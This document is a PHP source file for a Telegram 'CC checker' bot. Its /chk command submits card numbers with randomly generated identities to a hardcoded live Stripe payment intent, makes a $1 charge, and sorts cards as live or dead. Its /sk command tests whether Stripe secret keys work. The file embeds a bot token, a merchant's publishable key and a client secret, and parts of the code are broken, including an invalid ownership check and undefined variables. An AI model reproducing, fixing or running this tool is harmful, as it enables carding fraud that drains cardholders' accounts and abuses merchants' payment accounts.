<?php

////////////////=============[Made with ❤️ by MTCTECHX]===============////////////////

///https://api.telegram.org/bot5523681865:AAGnS1eU7lHoltQIYvvgwelzmQHEj8DZivc/setwebhook?url=https://5f73-20-211-45-148.au.ngrok.io/mtcbot.php



$owner_id = ""; // eneter ur id
$botToken = "5523681865:AAGnS1eU7lHoltQIYvvgwelzmQHEj8DZivc"; // Enter ur bot token
$website = "https://api.telegram.org/bot".$botToken;
error_reporting(0);
$update = file_get_contents('php://input');
$update = json_decode($update, TRUE);
$print = print_r($update);
$chatId = $update["message"]["chat"]["id"];
$gId = $update["message"]["from"]["id"];
$userId = $update["message"]["from"]["id"];
$firstname = $update["message"]["from"]["first_name"];
$username = $update["message"]["from"]["username"];
$message = $update["message"]["text"];
$message_id = $update["message"]["message_id"];

//////////=========[Start Command]=========//////////

if ((strpos($message, ".start") === 0)||(strpos($message, "/start") === 0)){
sendMessage($chatId, "<code>WELCOME TO X CC CHECKER BOT🇧🇩 !  USE ME TO CHECK CC 😍. CONTACT </code>@mtctechx <code>TO GRANT PERMISSION TO USE ME..TYPE</code> /cmds <code> TO KNOW ALL MY COMMANDS..</code>");
}

//////////=========[Cmds Command]=========//////////

elseif ((strpos($message, ".cmds") === 0)||(strpos($message, "/cmds") === 0)){
sendMessage($chatId, "<code>SK KEY CHECK :</code> /sk <code>sk_live_.%0ACHARGE CC CHECK </code>/chk <code>%0ATO KNOW YOUR INFO</code> /info <code>%0A%0ACONTACT </code>@mtctechx <code>TO GET ACCESS 😍</code>");
}

//////////=========[Info Command]=========//////////

elseif ((strpos($message, ".info") === 0)||(strpos($message, "/info") === 0)){
sendMessage($chatId, "<b>ID:</b> <code>$userId</code>%0A<b>First Name:</b> $firstname%0A<b>Username:</b> @$username%0A%0A<b>Bot Made by: @MTCTECHX </b>");
}


//////////=========[Chk Command]=========//////////

if ((strpos($message, ".chk") === 0)||(strpos($message, "/chk") === 0)){
$checkUser = userCheck($userId);
if($checkUser == False){
      return;
}
$lista = substr($message, 5);
$i     = explode("|", $lista);
$cc    = $i[0];
$mes   = $i[1];
$ano  = $i[2];
$ano1 = substr($yyyy, 2, 4);
$cvv   = $i[3];
error_reporting(0);
date_default_timezone_set('Asia/Jakarta');
if ($_SERVER['REQUEST_METHOD'] == "POST"){
extract($_POST);
}
elseif ($_SERVER['REQUEST_METHOD'] == "GET"){
extract($_GET);
}
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);  
return $str[0];
};
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

///////////////////////////////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank1 = GetStr($fim, '"bank":{"name":"', '"');
$name2 = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$emoji = GetStr($fim, '"emoji":"', '"');
$name1 = "".$name2."".$emoji."";
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
$currency = GetStr($fim, '"currency":"', '"');
if(strpos($fim, '"type":"credit"') !== false){
$bin = 'Credit';
}else{
$bin = 'Debit';
}

curl_close($ch);

///////////////////////////////////////////////////////////////////////////////////////////////////////////////

////////////////////////////===[Randomizing Details 

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

///////////////=[1st REQ]=/////////////////

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents/pi_3LE5OgHKSiz0kTyd1jM4ah5X/confirm');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com',
'method: POST',
'path: /v1/payment_intents/pi_3LE5OgHKSiz0kTyd1jM4ah5X/confirm h2',
'scheme: https',
'accept: application/json',
'accept-language: en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Linux; Android 8.1.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.125 Mobile Safari/537.36',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

# ----------------- [1req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method_data[type]=card&payment_method_data[billing_details][name]='.$name.'+'.$last.'&payment_method_data[card][number]='.$cc.'&payment_method_data[card][cvc]='.$cvv.'&payment_method_data[card][exp_month]='.$mes.'&payment_method_data[card][exp_year]='.$ano.'&payment_method_data[guid]=a95446a6-b75c-4429-bb68-7489e6957ab2f764dd&payment_method_data[muid]=cdf9bfe6-aab2-4c91-b4c7-2abf52a483ee3be400&payment_method_data[sid]=cb1d62e5-c28a-4d36-bfc0-550732abfc6bb4a5f1&payment_method_data[payment_user_agent]=stripe.js%2F988743ca6%3B+stripe-js-v3%2F988743ca6&payment_method_data[time_on_page]=104603&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_iHIxB7OJrLLocOUih5WWEfc3&client_secret=pi_3LE5OgHKSiz0kTyd1jM4ah5X_secret_63UzakccvPfNLxgdlaQiDhBVd');


 $result1 = curl_exec($ch);
 $id = trim(strip_tags(getStr($result1,'"id": "','"')));
 
$cvc_check = trim(strip_tags(getStr($result2,'"cvc_check":"','"')));
 $info = curl_getinfo($ch);
$time = $info['total_time'];
$httpCode = $info['http_code'];
$time = substr($time, 0, 4);
curl_close($ch);

//////////////////////////////////////////////////////////////////////////////////////////////////////////////
if ((strpos($result1, 'incorrect_zip')) || (strpos($result1, 'Your card zip code is incorrect.')) || (strpos($result1, 'The zip code you supplied failed validation.'))){

sendMessage($chatId, '𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅%0A%0A𝗖𝗖 ⇾ <code>'.$lista.'</code>%0A𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge 1$ ✳️%0A𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ CVV MATCH✅%0A%0A<b>Checked By</b> @'.$username.'%0A<b>Bot By</b> @mtctechx %0A%0A𝗧𝗼𝗼𝗸 '.$time.' 𝘀𝗲𝗰𝗼𝗻𝗱𝘀');
}
elseif (strpos($result1, "success")){
sendMessage($chatId, '𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅%0A%0A𝗖𝗖 ⇾ <code>'.$lista.'</code>%0A𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge 1$ ✳️%0A𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ CHARGED 1$✅%0A%0A<b>Checked By</b> @'.$username.'%0A<b>Bot By</b> @mtctechx %0A%0A𝗧𝗼𝗼𝗸 '.$time.' 𝘀𝗲𝗰𝗼𝗻𝗱𝘀');
}

elseif ((strpos($result1, 'Your card has insufficient funds.')) || (strpos($result1, "insufficient_funds"))){
sendMessage($chatId, '𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅%0A%0A𝗖𝗖 ⇾ <code>'.$lista.'</code>%0A𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge 1$ ✳️%0A𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Insufficient Funds ⚠️%0A%0A<b>Checked By</b> @'.$username.'%0A<b>Bot By</b> @mtctechx %0A%0A𝗧𝗼𝗼𝗸 '.$time.' 𝘀𝗲𝗰𝗼𝗻𝗱𝘀');
}
elseif ((strpos($result1, "Your card's security code is incorrect.")) || (strpos($result1, "incorrect_cvc")) || (strpos($result1, "The card's security code is incorrect."))){
sendMessage($chatId, '𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅%0A%0A𝗖𝗖 ⇾ <code>'.$lista.'</code>%0A𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge 1$ ✳️%0A𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ CCN LIVE ❇️%0A%0A<b>Checked By</b> @'.$username.'%0A<b>Bot By</b> @mtctechx %0A%0A𝗧𝗼𝗼𝗸 '.$time.' 𝘀𝗲𝗰𝗼𝗻𝗱𝘀');
}
elseif ((strpos($result1, "Your card does not support this type of purchase.")) || (strpos($result1, "transaction_not_allowed"))){
sendMessage($chatId, '𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌%0A%0A𝗖𝗖 ⇾ <code>'.$lista.'</code>%0A𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge 1$ ✳️%0A𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Card Does not Support Purchase ⚠️%0A%0A<b>Checked By</b> @'.$username.'%0A<b>Bot By</b> @mtctechx %0A%0A𝗧𝗼𝗼𝗸 '.$time.' 𝘀𝗲𝗰𝗼𝗻𝗱𝘀');
}
elseif (strpos($result1, "do_not_honor")){
sendMessage($chatId, '𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌%0A%0A𝗖𝗖 ⇾ <code>'.$lista.'</code>%0A𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge 1$ ✳️%0A𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Do Not Honor ❌%0A%0A<b>Checked By</b> @'.$username.'%0A<b>Bot By</b> @mtctechx %0A%0A𝗧𝗼𝗼𝗸 '.$time.' 𝘀𝗲𝗰𝗼𝗻𝗱𝘀');
}
elseif (strpos($result1, "do_not_honor")){

sendMessage($chatId, '𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌%0A%0A𝗖𝗖 ⇾ <code>'.$lista.'</code>%0A𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge 1$ ✳️%0A𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Do Not Honor ❌%0A%0A<b>Checked By</b> @'.$username.'%0A<b>Bot By</b> @mtctechx %0A%0A𝗧𝗼𝗼𝗸 '.$time.' 𝘀𝗲𝗰𝗼𝗻𝗱𝘀');

}
elseif (strpos($result1, "stolen_card")){
sendMessage($chatId, '𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌%0A%0A𝗖𝗖 ⇾ <code>'.$lista.'</code>%0A𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge 1$ ✳️%0A𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Stolen Card ⚠️%0A%0A<b>Checked By</b> @'.$username.'%0A<b>Bot By</b> @mtctechx %0A%0A𝗧𝗼𝗼𝗸 '.$time.' 𝘀𝗲𝗰𝗼𝗻𝗱𝘀');
}
elseif (strpos($result1, "lost_card")){

sendMessage($chatId, '𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌%0A%0A𝗖𝗖 ⇾ <code>'.$lista.'</code>%0A𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge 1$ ✳️%0A𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Lost Card ⚠️%0A%0A<b>Checked By</b> @'.$username.'%0A<b>Bot By</b> @mtctechx %0A%0A𝗧𝗼𝗼𝗸 '.$time.' 𝘀𝗲𝗰𝗼𝗻𝗱𝘀');
}
elseif (strpos($result1, "pickup_card")){

sendMessage($chatId, '𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌%0A%0A𝗖𝗖 ⇾ <code>'.$lista.'</code>%0A𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge 1$ ✳️%0A𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Pickup Card ❌%0A%0A<b>Checked By</b> @'.$username.'%0A<b>Bot By</b> @mtctechx %0A%0A𝗧𝗼𝗼𝗸 '.$time.' 𝘀𝗲𝗰𝗼𝗻𝗱𝘀');
}
elseif ((strpos($result1, 'The card number is incorrect.')) || (strpos($result1, 'Your card number is incorrect.')) || (strpos($result1, 'incorrect_number'))){
sendMessage($chatId, '𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌%0A%0A𝗖𝗖 ⇾ <code>'.$lista.'</code>%0A𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge 1$ ✳️%0A𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Incorrect Card Number ❌%0A%0A<b>Checked By</b> @'.$username.'%0A<b>Bot By</b> @mtctechx %0A%0A𝗧𝗼𝗼𝗸 '.$time.' 𝘀𝗲𝗰𝗼𝗻𝗱𝘀');
}
elseif ((strpos($result1, 'Your card has expired.')) || (strpos($result1, 'expired_card'))){
sendMessage($chatId, '𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌%0A%0A𝗖𝗖 ⇾ <code>'.$lista.'</code>%0A𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge 1$ ✳️%0A𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Expired Card ❌%0A%0A<b>Checked By</b> @'.$username.'%0A<b>Bot By</b> @mtctechx %0A%0A𝗧𝗼𝗼𝗸 '.$time.' 𝘀𝗲𝗰𝗼𝗻𝗱𝘀');
}
elseif (strpos($result1, "generic_decline")){
sendMessage($chatId, '𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌%0A%0A𝗖𝗖 ⇾ <code>'.$lista.'</code>%0A𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge 1$ ✳️%0A𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Generic Decline ❌%0A%0A<b>Checked By</b> @'.$username.'%0A<b>Bot By</b> @mtctechx %0A%0A𝗧𝗼𝗼𝗸 '.$time.' 𝘀𝗲𝗰𝗼𝗻𝗱𝘀');
}
elseif (strpos($result1, "fraudulent")){
sendMessage($chatId, '𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌%0A%0A𝗖𝗖 ⇾ <code>'.$lista.'</code>%0A𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge 1$ ✳️%0A𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Fraudulent ❌%0A%0A<b>Checked By</b> @'.$username.'%0A<b>Bot By</b> @mtctechx %0A%0A𝗧𝗼𝗼𝗸 '.$time.' 𝘀𝗲𝗰𝗼𝗻𝗱𝘀');
}
elseif (strpos($result1, "lock_timeout")){

sendMessage($chatId, '𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌%0A%0A𝗖𝗖 ⇾ <code>'.$lista.'</code>%0A𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge 1$ ✳️%0A𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Try Another Time❌%0A%0A<b>Checked By</b> @'.$username.'%0A<b>Bot By</b> @mtctechx %0A%0A𝗧𝗼𝗼𝗸 '.$time.' 𝘀𝗲𝗰𝗼𝗻𝗱𝘀');
}
elseif ((strpos($result1, "Your card was declined.")) || (strpos($result1, 'The card was declined.'))){
sendMessage($chatId, '𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌%0A%0A𝗖𝗖 ⇾ <code>'.$lista.'</code>%0A𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge 1$ ✳️%0A𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Generic Decline ❌%0A%0A<b>Checked By</b> @'.$username.'%0A<b>Bot By</b> @mtctechx %0A%0A𝗧𝗼𝗼𝗸 '.$time.' 𝘀𝗲𝗰𝗼𝗻𝗱𝘀');
}
elseif(!$result2){
sendMessage($chatId, ''.$result1.'');
}else{
sendMessage($chatId, ''.$result1.'');
}
curl_close($ch);
}


//////////=========[Sk Key Check Command]=========//////////

elseif ((strpos($message, "!sk") === 0)||(strpos($message, "/sk") === 0)){
$sec = substr($message, 4);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "card[number]=5154620061414478&card[exp_month]=01&card[exp_year]=2023&card[cvc]=235");
curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');
$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);
if (strpos($result, 'api_key_expired')){
sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> EXPIRED KEY%0A%0A<b>Bot Made by: MTCTECHX </b>");
}
elseif (strpos($result, 'Invalid API Key provided')){
sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> INVALID KEY%0A%0A<b>Bot Made by: MTCTECHX </b>");
}
elseif ((strpos($result, 'testmode_charges_only')) || (strpos($result, 'test_mode_live_card'))){
sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> Testmode Charges Only%0A%0A<b>Bot Made by: MTCTECHX </b>");
}else{
sendMessage($chatId, "<b>✅ LIVE KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>RESPONSE:</u> SK LIVE!!%0A%0A<b>Bot Made by: MTCTECHX </b>");
}}


////////////////////////////////////////////////////////////////////////////////////////////////

function sendMessage ($chatId, $message){
$url = $GLOBALS[website]."/sendMessage?chat_id=".$chatId."&text=".$message."&reply_to_message_id=".$message_id."&parse_mode=HTML";
file_get_contents($url);      
}

function userCheck($userID){
 if(.$userID != .$owner_id){
        return False;
    }
}

////////////////=============[MTCTECHX]===============////////////////
////////==========[Used api raw bot of @Zeltraxrockzzz]============////////

?>
